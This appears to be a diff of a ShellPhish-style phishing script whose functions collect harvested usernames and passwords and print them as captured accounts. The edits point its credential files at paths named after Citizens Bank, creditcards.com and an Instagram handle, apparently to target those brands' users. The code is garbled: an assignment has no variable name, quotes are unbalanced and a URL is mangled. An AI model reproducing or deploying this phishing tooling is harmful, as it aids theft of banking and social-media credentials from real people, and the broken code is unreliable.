@@ -84,7 +84,7 @@ printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Shell
 printf "\n"
 }
 
-catch_cred() { =$(grep -e.*' sites/$server/usernames.txt | cut -d " " -f2)
+catch_cred() { =$(grep -e.*' www.citizensbank.com/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' Instagram/$http:\\instagram .com/otf_vah/lul.vah.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $otf_vah
@@ -199,11 +199,11 @@ getcredentials
 }
 
 start() {./shellphish.sh
-if [[ -e sites/$server/ip.txt ]]; then
+if [[ -e www.citizensbank.com/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e sites/$server/usernames.txt ]]; then
+if [[ -e www.creditcards.com/$server/usernames.txt ]]; then
 rm -rf sites/$server/usernames.txt
 
 fi
